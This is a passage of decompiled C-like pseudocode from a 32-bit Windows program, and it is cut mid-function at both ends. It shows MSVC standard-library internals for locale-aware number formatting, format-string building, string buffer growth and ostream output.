      if ( v12 == 120 || v12 == 88 )
      {
        v9 += 2;
        v56 = v11;
      }
    }
  }
  v13 = *(_DWORD *)(a5 + 48);
  v62 = 0;
  v53 = *(_DWORD *)(v13 + 4);
  (*(void (**)(void))(*(_DWORD *)v53 + 4))();
  v62 = 1;
  *(_DWORD *)v54 = sub_40C210((int)&savedregs, (int)&v52);
  v62 = 2;
  if ( v53 )
  {
    v14 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v53 + 8))(v53);
    if ( v14 )
      (**v14)(v14, 1);
  }
  v62 = -1;
  sub_409E40((char **)Src, Size, 0);
  v15 = Src;
  v62 = 3;
  if ( v61 >= 0x10 )
    v15 = (void **)Src[0];
  (*(void (__thiscall **)(_DWORD, int, size_t, void **))(**(_DWORD **)v54 + 28))(*(_DWORD *)v54, v55, v55 + Size, v15);
  v16 = *(_DWORD *)(a5 + 48);
  LOBYTE(v62) = 4;
  v53 = *(_DWORD *)(v16 + 4);
  (*(void (**)(void))(*(_DWORD *)v53 + 4))();
  LOBYTE(v62) = 5;
  v17 = sub_410C60((int)&v52);
  v55 = (int)v17;
  LOBYTE(v62) = 6;
  if ( v53 )
  {
    v18 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v53 + 8))(v53);
    if ( v18 )
      (**v18)(v18, 1);
  }
  LOBYTE(v62) = 3;
  (*(void (__thiscall **)(void *, void **))(*(_DWORD *)v17 + 20))(v17, Block);
  LOBYTE(v62) = 7;
  v19 = Block;
  if ( v58 >= 0x10 )
    v19 = (void **)Block[0];
  if ( *(_BYTE *)v19 != 127 && *(char *)v19 > 0 )
  {
    v20 = (*(int (__thiscall **)(int))(*(_DWORD *)v55 + 16))(v55);
    v21 = *(_BYTE *)v19 == 127;
    v54[0] = v20;
    if ( !v21 )
    {
      do
      {
        if ( *(char *)v19 <= 0 )
          break;
        v22 = *(char *)v19;
        if ( v22 >= v8 - v9 )
          break;
        v8 -= v22;
        if ( v60 < v8 )
          sub_403840();
        v23 = v60;
        if ( v61 == v60 )
        {
          LOBYTE(v55) = 0;
          sub_410DE0((char **)Src, 1u, v55, v8, 1u, v54[0]);
        }
        else
        {
          v24 = Src;
          ++v60;
          if ( v61 >= 0x10 )
            v24 = (void **)Src[0];
          v25 = (char *)v24 + v8;
          memmove((char *)v24 + v8 + 1, (char *)v24 + v8, v23 - v8 + 1);
          *v25 = v54[0];
        }
        v26 = (void **)((char *)v19 + 1);
        v9 = (int)v56;
        if ( *((char *)v19 + 1) <= 0 )
          v26 = v19;
        v19 = v26;
      }
      while ( *(_BYTE *)v26 != 127 );
    }
  }
  v27 = v50;
  v55 = v60;
  if ( *(__int64 *)(v50 + 32) <= 0 || (v28 = *(_DWORD *)(v50 + 32), v28 <= v60) )
    v29 = 0;
  else
    v29 = v28 - v60;
  v30 = *(_DWORD *)(v50 + 20) & 0x1C0;
  if ( v30 == 64 )
  {
    v36 = (unsigned __int8 *)Src;
    if ( v61 >= 0x10 )
      v36 = (unsigned __int8 *)Src[0];
    v33 = sub_40FE30(a1, &v52, a3, a4, v36, v9);
  }
  else if ( v30 == 256 )
  {
    v34 = (unsigned __int8 *)Src;
    if ( v61 >= 0x10 )
      v34 = (unsigned __int8 *)Src[0];
    v35 = sub_40FE30(a1, &v52, a3, a4, v34, v9);
    v33 = sub_40FDB0(a1, &v52, *v35, (_DWORD *)v35[1], a6, v29);
    v29 = 0;
  }
  else
  {
    v31 = sub_40FDB0(a1, &v52, a3, a4, a6, v29);
    v29 = 0;
    v32 = (unsigned __int8 *)Src;
    if ( v61 >= 0x10 )
      v32 = (unsigned __int8 *)Src[0];
    v33 = sub_40FE30(a1, &v52, *v31, (_DWORD *)v31[1], v32, v9);
  }
  v37 = *v33;
  v56 = (_DWORD *)v33[1];
  v38 = Src;
  if ( v61 >= 0x10 )
    v38 = (void **)Src[0];
  v39 = sub_40FE30(a1, &v49, v37, v56, (unsigned __int8 *)v38 + v9, v55 - v9);
  v48 = v29;
  v40 = v51;
  v47 = *v39;
  v46 = v51;
  v64 = (_DWORD *)v39[1];
  *(_DWORD *)(v27 + 32) = 0;
  *(_DWORD *)(v27 + 36) = 0;
  sub_40FDB0(a1, v46, v47, v64, a6, v48);
  if ( v58 >= 0x10 )
  {
    v41 = Block[0];
    if ( v58 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_71;
      v42 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v42 >= Block[0] || (unsigned int)(Block[0] - v42) < 4 || (unsigned int)(Block[0] - v42) > 0x23 )
        goto LABEL_71;
      v41 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v41);
  }
  Block[4] = 0;
  v58 = 15;
  LOBYTE(Block[0]) = 0;
  if ( v61 >= 0x10 )
  {
    v43 = Src[0];
    if ( v61 + 1 < 0x1000 )
    {
LABEL_69:
      j__free(v43);
      return v40;
    }
    if ( ((int)Src[0] & 0x1F) == 0 )
    {
      v44 = (void *)*((_DWORD *)Src[0] - 1);
      if ( v44 < Src[0] && (unsigned int)(Src[0] - v44) >= 4 && (unsigned int)(Src[0] - v44) <= 0x23 )
      {
        v43 = (void *)*((_DWORD *)Src[0] - 1);
        goto LABEL_69;
      }
    }
LABEL_71:
    _invalid_parameter_noinfo_noreturn();
  }
  return v40;
}

//----- (004102D0) --------------------------------------------------------
_BYTE *__cdecl sub_4102D0(int a1, _BYTE *a2, _BYTE *a3, __int16 a4)
{
  _BYTE *v4; // eax
  int v5; // edx
  char v7; // cl

  *a2 = 37;
  v4 = a2 + 1;
  if ( (a4 & 0x20) != 0 )
  {
    *v4 = 43;
    v4 = a2 + 2;
  }
  if ( (a4 & 8) != 0 )
    *v4++ = 35;
  if ( *a3 == 76 )
  {
    *(_WORD *)v4 = 13897;
    v4 += 2;
    *v4 = 52;
  }
  else
  {
    *v4 = *a3;
  }
  v5 = a4 & 0xE00;
  if ( v5 == 1024 )
  {
    v4[1] = 111;
    v4[2] = 0;
    return a2;
  }
  else
  {
    if ( v5 == 2048 )
      v7 = ~(8 * a4) & 0x20 | 0x58;
    else
      v7 = a3[1];
    v4[1] = v7;
    v4[2] = 0;
    return a2;
  }
}

//----- (00410360) --------------------------------------------------------
_DWORD *__cdecl sub_410360(
        int a1,
        _DWORD *a2,
        int a3,
        _DWORD *a4,
        __int64 *a5,
        unsigned __int8 a6,
        char *Str,
        size_t Size)
{
  int v8; // esi
  int v9; // eax
  const char *v10; // edx
  int v11; // eax
  char v12; // cl
  unsigned int v13; // edi
  int v14; // eax
  void (__thiscall ***v15)(_DWORD, int); // eax
  void **v16; // eax
  int v17; // eax
  struct std::_Facet_base *v18; // ecx
  void (__thiscall ***v19)(_DWORD, int); // eax
  bool v20; // zf
  char v21; // cl
  void **v22; // eax
  char *v23; // ebx
  unsigned int v24; // ecx
  unsigned int v25; // edx
  void **v26; // eax
  _BYTE *v27; // esi
  char *v28; // eax
  __int64 *v29; // ebx
  unsigned int v30; // edi
  int v31; // edi
  int v32; // eax
  int *v33; // ecx
  unsigned __int8 *v34; // eax
  int *v35; // eax
  unsigned __int8 *v36; // eax
  int *v37; // eax
  unsigned __int8 *v38; // eax
  int v39; // edx
  void **v40; // eax
  int *v41; // eax
  void *v42; // ecx
  void *v43; // eax
  void *v44; // ecx
  void *v45; // eax
  int v47; // [esp-28h] [ebp-A0h]
  int v48; // [esp+14h] [ebp-64h] BYREF
  char v49[4]; // [esp+18h] [ebp-60h]
  int v50; // [esp+1Ch] [ebp-5Ch]
  int v51; // [esp+20h] [ebp-58h] BYREF
  int v52; // [esp+24h] [ebp-54h]
  int v53; // [esp+28h] [ebp-50h]
  __int64 *v54; // [esp+2Ch] [ebp-4Ch]
  struct std::_Facet_base *v55; // [esp+30h] [ebp-48h]
  void *Block[5]; // [esp+34h] [ebp-44h] BYREF
  unsigned int v57; // [esp+48h] [ebp-30h]
  void *Src[4]; // [esp+4Ch] [ebp-2Ch] BYREF
  unsigned int v59; // [esp+5Ch] [ebp-1Ch]
  unsigned int v60; // [esp+60h] [ebp-18h]
  char Control[2]; // [esp+64h] [ebp-14h] BYREF
  int v62; // [esp+74h] [ebp-4h]
  int savedregs; // [esp+78h] [ebp+0h] BYREF
  _DWORD *v64; // [esp+8Ch] [ebp+14h]

  v54 = a5;
  *(_DWORD *)v49 = Str;
  v8 = Size && (*Str == 43 || *Str == 45);
  v9 = *((_DWORD *)a5 + 5) & 0x3000;
  v50 = v8;
  if ( v9 == 12288 )
  {
    v11 = v8 + 2;
    v10 = "pP";
    if ( v8 + 2 <= Size && Str[v8] == 48 )
    {
      v12 = Str[v8 + 1];
      if ( v12 == 120 || v12 == 88 )
      {
        v8 += 2;
        v50 = v11;
      }
    }
  }
  else
  {
    v10 = "eE";
  }
  v53 = strcspn(Str, v10);
  strcpy(Control, ".");
  Control[0] = *localeconv()->decimal_point;
  v13 = strcspn(Str, Control);
  v14 = *((_DWORD *)v54 + 12);
  v62 = 0;
  v52 = *(_DWORD *)(v14 + 4);
  (*(void (**)(void))(*(_DWORD *)v52 + 4))();
  v62 = 1;
  v55 = sub_40C210((int)&savedregs, (int)&v51);
  v62 = 2;
  if ( v52 )
  {
    v15 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v52 + 8))(v52);
    if ( v15 )
      (**v15)(v15, 1);
  }
  v62 = -1;
  sub_409E40((char **)Src, Size, 0);
  v16 = Src;
  v62 = 3;
  if ( v60 >= 0x10 )
    v16 = (void **)Src[0];
  (*(void (__thiscall **)(struct std::_Facet_base *, _DWORD, size_t, void **))(*(_DWORD *)v55 + 28))(
    v55,
    *(_DWORD *)v49,
    *(_DWORD *)v49 + Size,
    v16);
  v17 = *((_DWORD *)v54 + 12);
  LOBYTE(v62) = 4;
  v52 = *(_DWORD *)(v17 + 4);
  (*(void (**)(void))(*(_DWORD *)v52 + 4))();
  LOBYTE(v62) = 5;
  v18 = (struct std::_Facet_base *)sub_410C60((int)&v51);
  v55 = v18;
  LOBYTE(v62) = 6;
  if ( v52 )
  {
    v19 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v52 + 8))(v52);
    if ( v19 )
      (**v19)(v19, 1);
    v18 = v55;
  }
  LOBYTE(v62) = 3;
  (*(void (__thiscall **)(struct std::_Facet_base *, void **))(*(_DWORD *)v18 + 20))(v18, Block);
  LOBYTE(v62) = 7;
  v49[0] = (*(int (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v55 + 16))(v55);
  v20 = v13 == Size;
  if ( v13 != Size )
  {
    v21 = (*(int (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v55 + 12))(v55);
    v22 = Src;
    if ( v60 >= 0x10 )
      v22 = (void **)Src[0];
    v20 = v13 == Size;
    *((_BYTE *)v22 + v13) = v21;
  }
  if ( v20 )
    v13 = v53;
  v23 = (char *)Block;
  if ( v57 >= 0x10 )
    v23 = (char *)Block[0];
  if ( *v23 != 127 )
  {
    do
    {
      if ( *v23 <= 0 )
        break;
      v24 = *v23;
      if ( v24 >= v13 - v8 )
        break;
      v13 -= v24;
      if ( v59 < v13 )
        sub_403840();
      v25 = v59;
      if ( v60 == v59 )
      {
        LOBYTE(v53) = 0;
        sub_410DE0((char **)Src, 1u, v53, v13, 1u, v49[0]);
      }
      else
      {
        v26 = Src;
        ++v59;
        if ( v60 >= 0x10 )
          v26 = (void **)Src[0];
        v27 = (char *)v26 + v13;
        memmove((char *)v26 + v13 + 1, (char *)v26 + v13, v25 - v13 + 1);
        *v27 = v49[0];
      }
      v28 = v23 + 1;
      v8 = v50;
      if ( v23[1] <= 0 )
        v28 = v23;
      v23 = v28;
    }
    while ( *v28 != 127 );
  }
  v29 = v54;
  v53 = v59;
  if ( v54[4] <= 0 || (v30 = *((_DWORD *)v54 + 8), v30 <= v59) )
    v31 = 0;
  else
    v31 = v30 - v59;
  v32 = *((_DWORD *)v54 + 5) & 0x1C0;
  if ( v32 == 64 )
  {
    v38 = (unsigned __int8 *)Src;
    if ( v60 >= 0x10 )
      v38 = (unsigned __int8 *)Src[0];
    v35 = sub_40FE30(a1, &v51, a3, a4, v38, v8);
  }
  else if ( v32 == 256 )
  {
    v36 = (unsigned __int8 *)Src;
    if ( v60 >= 0x10 )
      v36 = (unsigned __int8 *)Src[0];
    v37 = sub_40FE30(a1, &v51, a3, a4, v36, v8);
    v35 = sub_40FDB0(a1, &v51, *v37, (_DWORD *)v37[1], a6, v31);
    v31 = 0;
  }
  else
  {
    v33 = sub_40FDB0(a1, &v51, a3, a4, a6, v31);
    v31 = 0;
    v34 = (unsigned __int8 *)Src;
    if ( v60 >= 0x10 )
      v34 = (unsigned __int8 *)Src[0];
    v35 = sub_40FE30(a1, &v51, *v33, (_DWORD *)v33[1], v34, v8);
  }
  v39 = *v35;
  v54 = (__int64 *)v35[1];
  v40 = Src;
  if ( v60 >= 0x10 )
    v40 = (void **)Src[0];
  v41 = sub_40FE30(a1, &v48, v39, v54, (unsigned __int8 *)v40 + v8, v53 - v8);
  v47 = *v41;
  v64 = (_DWORD *)v41[1];
  *((_DWORD *)v29 + 8) = 0;
  *((_DWORD *)v29 + 9) = 0;
  sub_40FDB0(a1, a2, v47, v64, a6, v31);
  if ( v57 >= 0x10 )
  {
    v42 = Block[0];
    if ( v57 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_77;
      v43 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v43 >= Block[0] || (unsigned int)(Block[0] - v43) < 4 || (unsigned int)(Block[0] - v43) > 0x23 )
        goto LABEL_77;
      v42 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v42);
  }
  Block[4] = 0;
  v57 = 15;
  LOBYTE(Block[0]) = 0;
  if ( v60 >= 0x10 )
  {
    v44 = Src[0];
    if ( v60 + 1 < 0x1000 )
    {
LABEL_75:
      j__free(v44);
      return a2;
    }
    if ( ((int)Src[0] & 0x1F) == 0 )
    {
      v45 = (void *)*((_DWORD *)Src[0] - 1);
      if ( v45 < Src[0] && (unsigned int)(Src[0] - v45) >= 4 && (unsigned int)(Src[0] - v45) <= 0x23 )
      {
        v44 = (void *)*((_DWORD *)Src[0] - 1);
        goto LABEL_75;
      }
    }
LABEL_77:
    _invalid_parameter_noinfo_noreturn();
  }
  return a2;
}

//----- (004107E0) --------------------------------------------------------
_BYTE *__cdecl sub_4107E0(int a1, _BYTE *a2, char a3, __int16 a4)
{
  _BYTE *v4; // eax
  _BYTE *v5; // eax
  int v6; // ecx

  *a2 = 37;
  v4 = a2 + 1;
  if ( (a4 & 0x20) != 0 )
  {
    *v4 = 43;
    v4 = a2 + 2;
  }
  if ( (a4 & 0x10) != 0 )
    *v4++ = 35;
  *(_WORD *)v4 = 10798;
  v5 = v4 + 2;
  if ( a3 )
    *v5++ = a3;
  v6 = a4 & 0x3000;
  if ( (a4 & 4) != 0 )
  {
    if ( v6 != 0x2000 )
    {
      if ( v6 == 12288 )
        *v5 = 65;
      else
        *v5 = 2 * (v6 != 4096) + 69;
      v5[1] = 0;
      return a2;
    }
LABEL_14:
    *v5 = 102;
    v5[1] = 0;
    return a2;
  }
  if ( v6 == 0x2000 )
    goto LABEL_14;
  if ( v6 == 12288 )
    *v5 = 97;
  else
    *v5 = 2 * (v6 != 4096) + 101;
  v5[1] = 0;
  return a2;
}

//----- (004108A0) --------------------------------------------------------
void *__thiscall sub_4108A0(void *Block, char a2)
{
  void *v4; // [esp-4h] [ebp-8h]

  v4 = (void *)*((_DWORD *)Block + 2);
  *(_DWORD *)Block = &std::numpunct<char>::`vftable';
  free(v4);
  free(*((void **)Block + 4));
  free(*((void **)Block + 5));
  *(_DWORD *)Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_414AF8(Block);
  return Block;
}
// 4353B4: using guessed type void *std::_Facet_base::`vftable';
// 436470: using guessed type void *std::numpunct<char>::`vftable';

//----- (00410910) --------------------------------------------------------
char *__fastcall sub_410910(char *a1, const char *a2)
{
  unsigned int v3; // ecx
  int v4; // eax
  int v5; // eax
  int v6; // edi
  unsigned int v7; // esi
  int v8; // edi
  unsigned int v9; // esi
  int v10; // ecx
  int v11; // eax
  char *v12; // ecx
  int v13; // ecx
  int v14; // ecx
  int v15; // eax
  _DWORD *v16; // ecx
  int *v17; // edx
  _DWORD *v18; // ecx
  unsigned __int8 *v19; // edx
  int v20; // eax
  int v21; // ecx
  int v22; // eax
  int v23; // edx
  int v24; // eax
  int v25; // ecx
  unsigned __int8 v26; // dl
  int v27; // eax
  _DWORD *v28; // ecx
  unsigned __int8 *v29; // edx
  int v30; // eax
  int v31; // eax
  char *v32; // esi
  char v33; // al
  char v34; // al
  int v35; // esi
  int v36; // ecx
  _DWORD v38[7]; // [esp+0h] [ebp-40h] BYREF
  unsigned int v39; // [esp+1Ch] [ebp-24h]
  __int64 v40; // [esp+20h] [ebp-20h]
  const char *v41; // [esp+28h] [ebp-18h]
  unsigned __int8 v42; // [esp+2Fh] [ebp-11h]
  _DWORD *v43; // [esp+30h] [ebp-10h]
  int v44; // [esp+3Ch] [ebp-4h]

  v43 = v38;
  v41 = a2;
  v38[6] = a1;
  v38[5] = 0;
  v3 = strlen(a2);
  v4 = *(_DWORD *)a1;
  v39 = v3;
  v5 = *(_DWORD *)(v4 + 4);
  v6 = *(_DWORD *)&a1[v5 + 36];
  v7 = *(_DWORD *)&a1[v5 + 32];
  if ( v6 >= 0 && (v6 > 0 || v7 && v7 > v3) )
  {
    v8 = (__PAIR64__(v6, v7) - v3) >> 32;
    v9 = v7 - v3;
  }
  else
  {
    v40 = 0i64;
    v8 = 0;
    v9 = 0;
  }
  v10 = *(_DWORD *)&a1[v5 + 56];
  LODWORD(v40) = a1;
  if ( v10 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v10 + 4))(v10);
  v44 = 0;
  v11 = *(_DWORD *)(*(_DWORD *)a1 + 4);
  if ( !*(_DWORD *)&a1[v11 + 12] )
  {
    v12 = *(char **)&a1[v11 + 60];
    if ( v12 )
    {
      if ( v12 != a1 )
        sub_40BE10(v12);
    }
  }
  v13 = *(_DWORD *)(*(_DWORD *)a1 + 4);
  BYTE4(v40) = *(_DWORD *)&a1[v13 + 12] == 0;
  v44 = 1;
  if ( BYTE4(v40) )
  {
    LOBYTE(v44) = 2;
    if ( (*(_DWORD *)&a1[v13 + 20] & 0x1C0) != 64 )
    {
      while ( v8 >= 0 && (v8 > 0 || v9) )
      {
        v15 = *(_DWORD *)(*(_DWORD *)a1 + 4);
        v42 = a1[v15 + 64];
        v16 = *(_DWORD **)&a1[v15 + 56];
        if ( *(_DWORD *)v16[8] && (v17 = (int *)v16[12], *v17 > 0) )
        {
          --*v17;
          v18 = (_DWORD *)v16[8];
          v19 = (unsigned __int8 *)(*v18)++;
          LOBYTE(v20) = v42;
          *v19 = v42;
          v20 = (unsigned __int8)v20;
        }
        else
        {
          v20 = (*(int (__thiscall **)(_DWORD *, _DWORD))(*v16 + 12))(v16, v42);
        }
        if ( v20 == -1 )
        {
          v14 = 4;
          goto LABEL_39;
        }
        v8 = (__PAIR64__(v8, v9--) - 1) >> 32;
      }
    }
    v21 = *(_DWORD *)&a1[*(_DWORD *)(*(_DWORD *)a1 + 4) + 56];
    v22 = (*(int (__thiscall **)(int, const char *, unsigned int, _DWORD))(*(_DWORD *)v21 + 36))(v21, v41, v39, 0);
    if ( v22 != v39 || v23 )
    {
LABEL_36:
      v14 = 4;
    }
    else
    {
      while ( v8 >= 0 && (v8 > 0 || v9) )
      {
        v24 = *(_DWORD *)(*(_DWORD *)a1 + 4);
        v25 = *(_DWORD *)&a1[v24 + 56];
        v26 = a1[v24 + 64];
        v42 = v26;
        if ( **(_DWORD **)(v25 + 32) && (v27 = **(_DWORD **)(v25 + 48), v27 > 0) )
        {
          **(_DWORD **)(v25 + 48) = v27 - 1;
          v28 = *(_DWORD **)(v25 + 32);
          v29 = (unsigned __int8 *)(*v28)++;
          LOBYTE(v30) = v42;
          *v29 = v42;
          v30 = (unsigned __int8)v30;
        }
        else
        {
          v30 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)v25 + 12))(v25, v26);
        }
        if ( v30 == -1 )
          goto LABEL_36;
        v8 = (__PAIR64__(v8, v9--) - 1) >> 32;
      }
      v14 = 0;
    }
LABEL_39:
    v31 = *(_DWORD *)(*(_DWORD *)a1 + 4);
    *(_DWORD *)&a1[v31 + 32] = 0;
    *(_DWORD *)&a1[v31 + 36] = 0;
    v44 = 1;
  }
  else
  {
    v14 = 4;
  }
  v32 = &a1[*(_DWORD *)(*(_DWORD *)a1 + 4)];
  if ( v14 )
  {
    v33 = v14 | v32[12] | 4;
    if ( *((_DWORD *)v32 + 14) )
      v33 = v14 | v32[12];
    sub_4043E0(&a1[*(_DWORD *)(*(_DWORD *)a1 + 4)], v33, 0);
  }
  v44 = 4;
  v34 = j____uncaught_exception(v14);
  v35 = v40;
  if ( !v34 )
    sub_40BEE0((_BYTE *)v40);
  LOBYTE(v44) = 5;
  v36 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)v35 + 4) + v35 + 56);
  if ( v36 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v36 + 8))(v36);
  return a1;
}
// 410976: conditional instruction was optimized away because edi.4==0
// 410978: conditional instruction was optimized away because edi.4==0
// 410A88: variable 'v23' is possibly undefined
// 410B6F: variable 'v14' is possibly undefined
// 41398B: using guessed type int __fastcall j____uncaught_exception(_DWORD);

//----- (00410BB0) --------------------------------------------------------
char *__cdecl sub_410BB0(char *a1)
{
  int v1; // eax
  struct std::_Facet_base *v2; // edi
  void (__thiscall ***v3)(_DWORD, int); // eax
  unsigned __int8 v4; // al
  char v6[4]; // [esp+Ch] [ebp-14h] BYREF
  int v7; // [esp+10h] [ebp-10h]
  int v8; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v1 = *(_DWORD *)&a1[*(_DWORD *)(*(_DWORD *)a1 + 4) + 48];
  v8 = 0;
  v7 = *(_DWORD *)(v1 + 4);
  (*(void (**)(void))(*(_DWORD *)v7 + 4))();
  v8 = 1;
  v2 = sub_40C210((int)&savedregs, (int)v6);
  v8 = 2;
  if ( v7 )
  {
    v3 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v7 + 8))(v7);
    if ( v3 )
      (**v3)(v3, 1);
  }
  v8 = -1;
  v4 = (*(int (__thiscall **)(struct std::_Facet_base *, int))(*(_DWORD *)v2 + 32))(v2, 10);
  sub_410F30(a1, v4);
  sub_40BE10(a1);
  return a1;
}
// 410BB0: using guessed type char var_14[4];

//----- (00410C60) --------------------------------------------------------
void *__cdecl sub_410C60(int a1)
{
  unsigned int v1; // edi
  int v2; // ecx
  void *v3; // esi
  int v4; // eax
  int v5; // ecx
  int v6; // ecx
  char *v7; // eax
  struct std::_Locinfo *v8; // eax
  char v10[52]; // [esp+Ch] [ebp-54h] BYREF
  int v11; // [esp+40h] [ebp-20h]
  int v12; // [esp+44h] [ebp-1Ch]
  char v13[4]; // [esp+48h] [ebp-18h] BYREF
  void *Block; // [esp+4Ch] [ebp-14h] BYREF
  int v15; // [esp+5Ch] [ebp-4h]

  v11 = a1;
  std::_Lockit::_Lockit((std::_Lockit *)v13, 0);
  v15 = 0;
  v1 = dword_45386C;
  v12 = dword_45381C;
  if ( !dword_45386C )
  {
    std::_Lockit::_Lockit((std::_Lockit *)&Block, 0);
    if ( !dword_45386C )
      dword_45386C = ++dword_452924;
    std::_Lockit::~_Lockit((std::_Lockit *)&Block);
    v1 = dword_45386C;
  }
  v2 = *(_DWORD *)(a1 + 4);
  if ( v1 >= *(_DWORD *)(v2 + 12) )
  {
    v3 = 0;
  }
  else
  {
    v3 = *(void **)(*(_DWORD *)(v2 + 8) + 4 * v1);
    if ( v3 )
      goto LABEL_20;
  }
  if ( !*(_BYTE *)(v2 + 20) )
    goto LABEL_12;
  v4 = sub_413763();
  if ( v1 < *(_DWORD *)(v4 + 12) )
  {
    v3 = *(void **)(*(_DWORD *)(v4 + 8) + 4 * v1);
LABEL_12:
    if ( v3 )
      goto LABEL_20;
  }
  if ( v12 )
  {
    v3 = (void *)v12;
  }
  else
  {
    v3 = operator new(0x18u);
    Block = v3;
    v5 = v11;
    LOBYTE(v15) = 1;
    *(_OWORD *)v3 = 0i64;
    *((_QWORD *)v3 + 2) = 0i64;
    v6 = *(_DWORD *)(v5 + 4);
    if ( v6 )
    {
      v7 = *(char **)(v6 + 24);
      if ( !v7 )
        v7 = (char *)(v6 + 28);
    }
    else
    {
      v7 = (char *)Locale;
    }
    v8 = sub_403B20((struct std::_Locinfo *)v10, v7);
    v12 = 1;
    *((_DWORD *)v3 + 1) = 0;
    v15 = 3;
    *(_DWORD *)v3 = &std::numpunct<char>::`vftable';
    sub_4110C0((int)v3, (int)v8, 1);
    v15 = 0;
    sub_403BE0((std::_Lockit *)v10);
    dword_45381C = (int)v3;
    (*(void (__thiscall **)(void *))(*(_DWORD *)v3 + 4))(v3);
    std::_Facet_Register((struct std::_Facet_base *)v3);
  }
LABEL_20:
  std::_Lockit::~_Lockit((std::_Lockit *)v13);
  return v3;
}
// 436470: using guessed type void *std::numpunct<char>::`vftable';
// 452924: using guessed type int dword_452924;
// 45381C: using guessed type int dword_45381C;
// 410C60: using guessed type char var_18[4];

//----- (00410DE0) --------------------------------------------------------
char **__thiscall sub_410DE0(char **Src, unsigned int a2, int a3, size_t Size, size_t a5, char a6)
{
  char *v7; // ecx
  unsigned int v8; // ebx
  int v9; // edi
  unsigned int v10; // ecx
  unsigned int v11; // edx
  char *v12; // ecx
  void *v13; // eax
  unsigned int v14; // ecx
  char **result; // eax
  char *v16; // [esp+10h] [ebp-10h]
  char *v18; // [esp+18h] [ebp-8h]
  char *Block; // [esp+1Ch] [ebp-4h]
  char *Blocka; // [esp+1Ch] [ebp-4h]

  v7 = Src[4];
  v16 = v7;
  if ( 0x7FFFFFFF - (int)v7 < a2 )
    sub_401F10();
  v8 = (unsigned int)Src[5];
  Block = &v7[a2];
  v9 = 0x7FFFFFFF;
  v10 = (unsigned int)&v7[a2] | 0xF;
  if ( v10 <= 0x7FFFFFFF )
  {
    v11 = v8 >> 1;
    if ( v8 <= 0x7FFFFFFF - (v8 >> 1) )
    {
      v9 = v10;
      if ( v10 < v11 + v8 )
        v9 = v11 + v8;
    }
  }
  v12 = (char *)sub_401C70(__CFADD__(v9, 1) ? -1 : v9 + 1);
  Src[5] = (char *)v9;
  v18 = v12;
  Src[4] = Block;
  if ( v8 < 0x10 )
  {
    memmove_0(v12, Src, Size);
    memset(&v18[Size], a6, a5);
    memmove_0(&v18[Size + a5], (char *)Src + Size, (size_t)&v16[-Size + 1]);
    result = Src;
    *Src = v18;
  }
  else
  {
    Blocka = *Src;
    memmove_0(v12, *Src, Size);
    memset(&v18[Size], a6, a5);
    memmove_0(&v18[Size + a5], &Blocka[Size], (size_t)&v16[-Size + 1]);
    v13 = Blocka;
    if ( v8 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)Blocka & 0x1F) != 0
        || (v14 = *((_DWORD *)Blocka - 1), v14 >= (unsigned int)Blocka)
        || (unsigned int)&Blocka[-v14] < 4
        || (unsigned int)&Blocka[-v14] > 0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v13 = (void *)*((_DWORD *)Blocka - 1);
    }
    j__free(v13);
    result = Src;
    *Src = v18;
  }
  return result;
}

//----- (00410F30) --------------------------------------------------------
char *__thiscall sub_410F30(char *this, unsigned __int8 a2)
{
  int v3; // eax
  int v4; // ecx
  int v5; // eax
  char *v6; // ecx
  int v7; // ecx
  int v8; // ecx
  _DWORD *v9; // ecx
  int *v10; // edx
  _DWORD *v11; // ecx
  _BYTE *v12; // edx
  int v13; // eax
  char *v14; // edi
  char v15; // al
  int v16; // ecx
  _DWORD v18[6]; // [esp+0h] [ebp-34h] BYREF
  bool v19; // [esp+18h] [ebp-1Ch]
  int v20; // [esp+1Ch] [ebp-18h]
  char *v21; // [esp+20h] [ebp-14h]
  _DWORD *v22; // [esp+24h] [ebp-10h]
  int v23; // [esp+30h] [ebp-4h]

  v22 = v18;
  v3 = *(_DWORD *)this;
  v21 = this;
  v20 = 0;
  v18[5] = this;
  v4 = *(_DWORD *)&this[*(_DWORD *)(v3 + 4) + 56];
  if ( v4 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v4 + 4))(v4);
  v23 = 0;
  v5 = *(_DWORD *)(*(_DWORD *)this + 4);
  if ( !*(_DWORD *)&this[v5 + 12] )
  {
    v6 = *(char **)&this[v5 + 60];
    if ( v6 )
    {
      if ( v6 != this )
        sub_40BE10(v6);
    }
  }
  v7 = *(_DWORD *)(*(_DWORD *)this + 4);
  v19 = *(_DWORD *)&this[v7 + 12] == 0;
  v23 = 1;
  if ( v19 )
  {
    LOBYTE(v23) = 2;
    v9 = *(_DWORD **)&this[v7 + 56];
    if ( *(_DWORD *)v9[8] && (v10 = (int *)v9[12], *v10 > 0) )
    {
      --*v10;
      v11 = (_DWORD *)v9[8];
      v12 = (_BYTE *)(*v11)++;
      v8 = 4;
      *v12 = a2;
      if ( a2 != -1 )
        v8 = 0;
    }
    else
    {
      v13 = (*(int (__thiscall **)(_DWORD *, _DWORD))(*v9 + 12))(v9, a2);
      v8 = 4;
      if ( v13 != -1 )
        v8 = 0;
    }
    v23 = 1;
  }
  else
  {
    v8 = 4;
  }
  v14 = &this[*(_DWORD *)(*(_DWORD *)this + 4)];
  if ( v8 )
  {
